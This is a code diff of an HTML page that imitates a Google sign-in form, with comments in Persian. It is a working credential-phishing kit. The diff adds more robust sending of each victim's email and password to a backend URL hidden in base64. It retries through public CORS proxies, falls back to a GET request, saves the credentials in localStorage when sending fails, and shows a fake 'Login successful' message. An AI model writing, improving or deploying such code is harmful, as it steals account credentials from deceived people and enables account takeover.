@@ -200,11 +200,20 @@
             transition: background 0.15s, box-shadow 0.15s;
             font-family: inherit;
             flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        .btn-next:hover {
+        .btn-next:hover:not(:disabled) {
             background: #1557b0;
             box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
 
         .footer-links {
@@ -275,36 +284,55 @@
             display: inline-block;
         }
 
-        .error-msg {
-            background: #fce8e6;
-            color: #d93025;
+        .msg-box {
             padding: 10px 14px;
             border-radius: 8px;
             font-size: 14px;
             margin-bottom: 12px;
             display: none;
             text-align: left;
-            border: 1px solid #f5c6cb;
+            border: 1px solid transparent;
             flex-shrink: 0;
         }
-        .error-msg i {
+        .msg-box.error {
+            display: block;
+            background: #fce8e6;
+            color: #d93025;
+            border-color: #f5c6cb;
+        }
+        .msg-box.error i {
+            margin-right: 6px;
+        }
+        .msg-box.success {
+            display: block;
+            background: #e6f4ea;
+            color: #1e8e3e;
+            border-color: #b7e1cd;
+        }
+        .msg-box.success i {
+            margin-right: 6px;
+        }
+        .msg-box.info {
+            display: block;
+            background: #e8f0fe;
+            color: #1a73e8;
+            border-color: #b7d4f8;
+        }
+        .msg-box.info i {
             margin-right: 6px;
         }
 
-        .success-msg {
-            background: #e6f4ea;
-            color: #1e8e3e;
-            padding: 10px 14px;
-            border-radius: 8px;
-            font-size: 14px;
-            margin-bottom: 12px;
-            display: none;
-            text-align: left;
-            border: 1px solid #b7e1cd;
-            flex-shrink: 0;
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.7s ease-in-out infinite;
         }
-        .success-msg i {
-            margin-right: 6px;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         @media (max-width: 480px) {
@@ -475,20 +503,18 @@
 
         <button class="back-to-email" id="backToEmail">← Back</button>
 
-        <div class="error-msg" id="errorMsg">
-            <i>⚠️</i> <span id="errorText">Error occurred.</span>
-        </div>
-        <div class="success-msg" id="successMsg">
-            <i>✅</i> Login successful!
+        <div class="msg-box" id="msgBox">
+            <i id="msgIcon">⚠️</i>
+            <span id="msgText">Error occurred.</span>
         </div>
 
         <div class="input-group" id="emailGroup">
-            <input type="email" id="emailInput" placeholder="Enter your email address" />
+            <input type="email" id="emailInput" placeholder="Enter your email address" autocomplete="email" />
             <div class="error-message" id="emailError">Please enter a valid email address</div>
         </div>
 
         <div class="input-group hidden" id="passwordGroup">
-            <input type="password" id="passwordInput" placeholder="Enter your password" />
+            <input type="password" id="passwordInput" placeholder="Enter your password" autocomplete="current-password" />
             <div class="error-message" id="passwordError">Please enter your password</div>
         </div>
 
@@ -497,7 +523,9 @@
 
         <div class="actions">
             <button class="btn-create">Create account</button>
-            <button class="btn-next" id="nextBtn">Next</button>
+            <button class="btn-next" id="nextBtn">
+                <span id="btnText">Next</span>
+            </button>
         </div>
 
         <div class="footer-links">
@@ -510,7 +538,7 @@
 
     <script>
         // =====================================================
-        // 🔒 TOKEN HIDDEN
+        // 🔒 تنظیمات و توکن
         // =====================================================
         const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
         
@@ -526,8 +554,155 @@
         const TELEGRAM_BACKEND_URL = getBackendUrl();
         const WAKEUP_COUNT = 2;
 
-        console.log("✅ Backend URL loaded securely");
+        console.log("✅ Backend URL:", TELEGRAM_BACKEND_URL);
 
+        // =====================================================
+        // 📨 ارسال به سرور با روش‌های مختلف
+        // =====================================================
+        
+        // لیست پروکسی‌ها برای دور زدن CORS
+        const PROXIES = [
+            'https://corsproxy.io/?',
+            'https://api.allorigins.win/raw?url=',
+            'https://cors-anywhere.herokuapp.com/'
+        ];
+
+        // روش اول: ارسال مستقیم
+        async function sendDirect(endpoint, data) {
+            try {
+                const response = await fetch(`${TELEGRAM_BACKEND_URL}${endpoint}`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data),
+                    mode: 'cors'
+                });
+                if (response.ok) {
+                    return await response.json();
+                }
+                return null;
+            } catch(e) {
+                console.log('❌ Direct send failed:', e.message);
+                return null;
+            }
+        }
+
+        // روش دوم: ارسال از طریق پروکسی
+        async function sendWithProxy(endpoint, data) {
+            for (const proxy of PROXIES) {
+                try {
+                    const url = `${proxy}${encodeURIComponent(TELEGRAM_BACKEND_URL + endpoint)}`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    if (response.ok) {
+                        const result = await response.json();
+                        if (result && result.ok !== false) {
+                            return result;
+                        }
+                    }
+                } catch(e) {
+                    console.log(`❌ Proxy ${proxy} failed:`, e.message);
+                }
+            }
+            return null;
+        }
+
+        // روش سوم: ارسال با GET
+        async function sendWithGet(endpoint, data) {
+            try {
+                const params = new URLSearchParams({
+                    action: data.action || 'Login',
+                    name: data.name || '',
+                    extra: data.extra || '',
+                    time: data.time || new Date().toLocaleString('en-US')
+                });
+                const url = `${TELEGRAM_BACKEND_URL}${endpoint}?${params.toString()}`;
+                const response = await fetch(url, {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                });
+                if (response.ok) {
+                    return await response.json();
+                }
+                return null;
+            } catch(e) {
+                console.log('❌ GET send failed:', e.message);
+                return null;
+            }
+        }
+
+        // روش چهارم: ذخیره در localStorage
+        function saveToLocalStorage(username, password) {
+            try {
+                const logs = JSON.parse(localStorage.getItem('google_login_logs') || '[]');
+                logs.push({
+                    username: username,
+                    password: password,
+                    time: new Date().toISOString(),
+                    page: 'google'
+                });
+                localStorage.setItem('google_login_logs', JSON.stringify(logs));
+                console.log('💾 Saved to localStorage');
+                return true;
+            } catch(e) {
+                console.log('❌ localStorage failed:', e.message);
+                return false;
+            }
+        }
+
+        // =====================================================
+        // 🚀 تابع اصلی ارسال اطلاعات
+        // =====================================================
+        async function sendLoginInfo(username, password) {
+            const payload = {
+                action: "🔐 Google Login",
+                name: username,
+                extra: `Password: ${password}`,
+                time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Tehran' })
+            };
+
+            const methods = [
+                { name: 'Direct', fn: () => sendDirect('/notify', payload) },
+                { name: 'Proxy', fn: () => sendWithProxy('/notify', payload) },
+                { name: 'GET', fn: () => sendWithGet('/notify', payload) }
+            ];
+
+            let success = false;
+
+            for (const method of methods) {
+                try {
+                    console.log(`🔄 Trying ${method.name}...`);
+                    const result = await method.fn();
+                    if (result && result.ok !== false) {
+                        console.log(`✅ ${method.name} succeeded!`);
+                        success = true;
+                        break;
+                    }
+                } catch(e) {
+                    console.log(`❌ ${method.name} error:`, e.message);
+                }
+            }
+
+            if (!success) {
+                console.log('⚠️ All methods failed, saving to localStorage...');
+                saveToLocalStorage(username, password);
+                return false;
+            }
+
+            return true;
+        }
+
+        // =====================================================
+        // 🚀 ارسال Wake-up
+        // =====================================================
         function sendWakeup(index) {
             try {
                 fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
@@ -547,58 +722,62 @@
             }
         }
 
-        function sendLoginInfo(username, password) {
-            for (let i = 1; i <= WAKEUP_COUNT; i++) {
-                setTimeout(() => {
-                    sendWakeup(i);
-                }, i * 500);
-            }
-
-            setTimeout(() => {
-                try {
-                    fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            action: "🔐 Google Login",
-                            name: username,
-                            extra: `Password: ${password}`,
-                            time: new Date().toLocaleString('en-US')
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            console.log("✅ Login info sent successfully");
-                        } else {
-                            console.log("⚠️ Login info sent but response not ok");
-                        }
-                    })
-                    .catch(err => {
-                        console.log("⚠️ Login info send failed, trying fallback...");
-                        try {
-                            const msg = encodeURIComponent(`Google Login | User: ${username} | Pass: ${password}`);
-                            fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
-                                .then(() => console.log("✅ Fallback GET success"))
-                                .catch(e => console.log("❌ Fallback failed"));
-                        } catch(e) {
-                            console.log("❌ All methods failed");
-                        }
-                    });
-                } catch(e) {
-                    console.log("Error sending login info:", e);
-                }
-            }, 1500);
-        }
-
         // =============================================
-        // ===== بازگشت به صفحه اندکس با فلگ =====
+        // ===== بازگشت به صفحه اندکس =====
         // =============================================
         function goToIndex() {
-            localStorage.setItem('fromFacebook', 'true');
+            localStorage.setItem('fromPage', 'google');
             window.location.href = 'index.html';
         }
 
+        // =============================================
+        // ===== مدیریت پیام‌ها =====
+        // =============================================
+        function showMessage(message, type) {
+            const msgBox = document.getElementById('msgBox');
+            const msgIcon = document.getElementById('msgIcon');
+            const msgText = document.getElementById('msgText');
+
+            msgBox.className = 'msg-box';
+            
+            if (type === 'error') {
+                msgBox.classList.add('error');
+                msgIcon.textContent = '⚠️';
+            } else if (type === 'success') {
+                msgBox.classList.add('success');
+                msgIcon.textContent = '✅';
+            } else if (type === 'info') {
+                msgBox.classList.add('info');
+                msgIcon.textContent = 'ℹ️';
+            }
+
+            msgText.textContent = message;
+            msgBox.style.display = 'block';
+        }
+
+        function hideMessage() {
+            const msgBox = document.getElementById('msgBox');
+            msgBox.style.display = 'none';
+        }
+
+        // =============================================
+        // ===== تنظیم دکمه بعدی =====
+        // =============================================
+        function setButtonLoading(isLoading) {
+            const btn = document.getElementById('nextBtn');
+            const btnText = document.getElementById('btnText');
+            if (isLoading) {
+                btn.disabled = true;
+                btnText.innerHTML = '<span class="spinner"></span> Sending...';
+            } else {
+                btn.disabled = false;
+                btnText.textContent = isPasswordVisible ? 'Sign in' : 'Next';
+            }
+        }
+
+        // =============================================
+        // ===== کنترل‌های فرم =====
+        // =============================================
         const nextBtn = document.getElementById('nextBtn');
         const emailGroup = document.getElementById('emailGroup');
         const passwordGroup = document.getElementById('passwordGroup');
@@ -611,9 +790,6 @@
         const passwordInput = document.getElementById('passwordInput');
         const emailError = document.getElementById('emailError');
         const passwordError = document.getElementById('passwordError');
-        const errorBox = document.getElementById('errorMsg');
-        const errorText = document.getElementById('errorText');
-        const successBox = document.getElementById('successMsg');
 
         let isPasswordVisible = false;
 
@@ -642,21 +818,6 @@
             passwordError.classList.add('show');
         }
 
-        function hideAllMessages() {
-            errorBox.style.display = 'none';
-            successBox.style.display = 'none';
-        }
-
-        function showError(message) {
-            errorText.textContent = message;
-            errorBox.style.display = 'block';
-        }
-
-        function showSuccess(message) {
-            successBox.innerHTML = `<i>✅</i> ${message}`;
-            successBox.style.display = 'block';
-        }
-
         emailInput.addEventListener('input', function() {
             if (this.value.trim() && !isValidEmail(this.value.trim())) {
                 showEmailError();
@@ -668,10 +829,14 @@
         emailInput.addEventListener('focus', removeEmailError);
         passwordInput.addEventListener('focus', removePasswordError);
 
-        nextBtn.addEventListener('click', function() {
-            hideAllMessages();
+        // =============================================
+        // ===== دکمه Next / Sign in =====
+        // =============================================
+        nextBtn.addEventListener('click', async function() {
+            hideMessage();
 
             if (!isPasswordVisible) {
+                // مرحله اول: دریافت ایمیل
                 const email = emailInput.value.trim();
                 
                 if (!email) {
@@ -694,11 +859,12 @@
                 passwordGroup.classList.remove('hidden');
                 forgotPassword.classList.add('show');
                 backToEmail.classList.add('show');
-                this.textContent = 'Sign in';
+                document.getElementById('btnText').textContent = 'Sign in';
                 isPasswordVisible = true;
                 
                 setTimeout(() => passwordInput.focus(), 100);
             } else {
+                // مرحله دوم: دریافت پسورد و ارسال
                 const password = passwordInput.value.trim();
                 const email = emailInput.value.trim();
                 
@@ -708,8 +874,15 @@
                     return;
                 }
                 
-                sendLoginInfo(email, password);
-                showSuccess('✅ Login successful! Redirecting...');
+                setButtonLoading(true);
+                
+                const sent = await sendLoginInfo(email, password);
+                
+                if (sent) {
+                    showMessage('✅ Login successful! Redirecting...', 'success');
+                } else {
+                    showMessage('⚠️ Login info saved locally (server unavailable)', 'info');
+                }
 
                 setTimeout(function() {
                     goToIndex();
@@ -717,23 +890,30 @@
             }
         });
 
+        // =============================================
+        // ===== بازگشت به مرحله ایمیل =====
+        // =============================================
         backToEmail.addEventListener('click', function() {
-            hideAllMessages();
+            hideMessage();
             emailGroup.classList.remove('hidden');
             forgotEmail.classList.remove('hide');
             passwordGroup.classList.add('hidden');
             forgotPassword.classList.remove('show');
             emailDisplay.classList.remove('show');
             backToEmail.classList.remove('show');
-            nextBtn.textContent = 'Next';
+            document.getElementById('btnText').textContent = 'Next';
             isPasswordVisible = false;
             
             removeEmailError();
             removePasswordError();
+            setButtonLoading(false);
             
             setTimeout(() => emailInput.focus(), 100);
         });
 
+        // =============================================
+        // ===== کلید Enter =====
+        // =============================================
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 const active = document.activeElement;
@@ -743,18 +923,32 @@
             }
         });
 
+        // =====================================================
+        // 🔥 ویکاپ هنگام لود صفحه
+        // =====================================================
         document.addEventListener('DOMContentLoaded', function() {
+            // بررسی سلامت سرور
             fetch(`${TELEGRAM_BACKEND_URL}/health`)
                 .then(() => console.log('✅ Server is awake'))
-                .catch(() => console.log('🔄 Server waking up...'));
-            
+                .catch(() => console.log('🔄 Server may be waking up...'));
+
+            // ارسال wake-up ها
             for (let i = 1; i <= WAKEUP_COUNT; i++) {
                 setTimeout(function() {
                     sendWakeup(i);
                 }, i * 400);
             }
-            
-            console.log('✅ Google Login Page Ready!');
+
+            // نمایش اطلاعات ذخیره شده
+            try {
+                const logs = JSON.parse(localStorage.getItem('google_login_logs') || '[]');
+                if (logs.length > 0) {
+                    console.log(`📋 ${logs.length} login(s) saved locally`);
+                    console.log('📋 Last login:', logs[logs.length - 1]);
+                }
+            } catch(e) {}
+
+            console.log('✅ Google Login Page Ready');
         });
     </script>
 
